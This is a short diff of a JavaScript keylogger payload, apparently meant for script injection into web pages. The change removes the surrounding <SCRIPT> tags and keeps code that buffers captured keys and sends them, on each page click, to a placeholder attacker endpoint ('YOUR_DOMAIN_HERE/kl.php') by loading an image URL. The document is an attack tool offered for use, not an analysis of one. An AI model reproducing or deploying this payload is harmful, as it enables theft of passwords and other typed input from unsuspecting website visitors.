@@ -1,4 +1,3 @@
-<SCRIPT>
 // Enter URL to "kl.php" API Here
 var url = 'http://YOUR_DOMAIN_HERE/kl.php?key='
 var array = [];
@@ -26,6 +25,3 @@ document.body.addEventListener('click', function(){
         new Image().src = url + command;
         array = [];}
 }, true); 
-</SCRIPT>
-
-
